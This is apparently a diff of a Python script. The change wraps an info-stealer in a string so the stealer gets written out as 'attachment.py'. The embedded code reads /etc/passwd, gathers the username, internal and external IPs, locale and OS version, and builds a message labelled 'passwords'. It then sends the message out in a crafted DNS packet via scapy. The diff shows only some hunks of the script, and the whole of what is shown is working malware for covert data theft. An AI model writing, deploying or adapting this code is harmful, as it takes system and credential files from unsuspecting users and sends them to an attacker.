@@ -1,4 +1,8 @@
-import os
+
+if __name__ == "__main__":
+
+    with open("attachment.py" , "w") as f:
+        f.write("""import os
 import socket
 import urllib.request
 import locale
@@ -8,11 +12,9 @@ from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 from scapy.layers.dns import DNS
 from scapy.layers.dns import DNSRR, DNSQR
-
-
-if __name__ == "__main__":
-
-
+        
+if __name__ == "__main__":        
+        
     # print(os.name) #posix for linux ot nt for windows
     if (os.name == "posix"): # linux
         with open("/etc/passwd", "rb") as f:
@@ -55,7 +57,7 @@ if __name__ == "__main__":
 
 
     #dns sending
-    message = "passwords: " + str(pass_file) + "\nusername: " +  username + "\nlocal IP: " + inside_ip + "\noutside IP: " + outside_ip + "\navailable_languages: " + str(available_languages) + "\nuser language: " + user_language + "\nOS version: " + version
+    message = "passwords: " + str(pass_file) + "\\nusername: " +  username + "\\nlocal IP: " + inside_ip + "\\noutside IP: " + outside_ip + "\\navailable_languages: " + str(available_languages) + "\\nuser language: " + user_language + "\\nOS version: " + version
 
 
 
@@ -90,6 +92,6 @@ if __name__ == "__main__":
 
     # Send the packet
     send(packet)
-    print("send!")
+    print("send!")""")
 
 
